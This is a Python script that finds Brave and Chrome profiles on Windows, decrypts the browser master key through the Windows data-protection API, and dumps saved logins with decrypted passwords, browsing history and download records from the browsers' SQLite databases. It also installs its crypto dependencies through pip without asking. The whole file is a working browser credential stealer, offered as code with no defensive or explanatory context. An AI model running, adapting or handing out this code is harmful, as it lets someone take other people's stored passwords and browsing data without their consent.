import base64
import json
import os
import shutil
import sqlite3
import sys
import subprocess

try:
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
except:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pycryptodome'])
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pypiwin32'])
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES

appdata_folder = os.getenv('LOCALAPPDATA')

browsers = {
    'brave': appdata_folder + '\\BraveSoftware\\Brave-Browser\\User Data',
    'google-chrome': appdata_folder + '\\Google\\Chrome\\User Data'
}


def getBrowserMasterKey(path: str):
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    if not ('os_crypt' in c):
        return
    local_state = json.loads(c)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def getInstalledBrowsers():
    installed_browners = []
    for b in browsers:
        if os.path.exists(browsers[b]):
            installed_browners.append(b)
    return installed_browners


def decryptData(encrypted_data: bytes, key: bytes):
    iv = encrypted_data[3:15]
    payload = encrypted_data[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def getData(path: str, key, db_filename: str, query: str, profile: str = "Default", is_encrypt: bool = True):
    db_file_path = path + "\\" + profile + "\\" + db_filename
    if not os.path.exists(db_file_path):
        return
    # Copy to avoid the database locked error
    shutil.copy(db_file_path, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(query)
    result = []
    for row in cursor.fetchall():
        row = list(row)
        if is_encrypt:
            for i in range(len(row)):
                data = row[i]
                # Check if data is in bytes type
                if isinstance(data, bytes):
                    row[i] = decryptData(data, key)
        # Print only for unempty row
        for x in row:
            if len(x) > 0:
                print(row)
                result.append(row)
                break
    conn.close()
    os.remove('temp_db')
    return result


if __name__ == '__main__':
    installed_browsers = getInstalledBrowsers()
    for b in installed_browsers:
        master_key = getBrowserMasterKey(browsers[b])
        print(b + " Passwords:")
        getData(browsers[b], master_key, "Login Data", 'SELECT action_url, username_value, password_value FROM logins')
        print(b + " History:")
        getData(browsers[b], master_key, "History", 'SELECT url, title, last_visit_time FROM urls', is_encrypt=False)
        print(b + "Download")
        getData(browsers[b], master_key, "History", 'SELECT tab_url, target_path FROM downloads', is_encrypt=False)
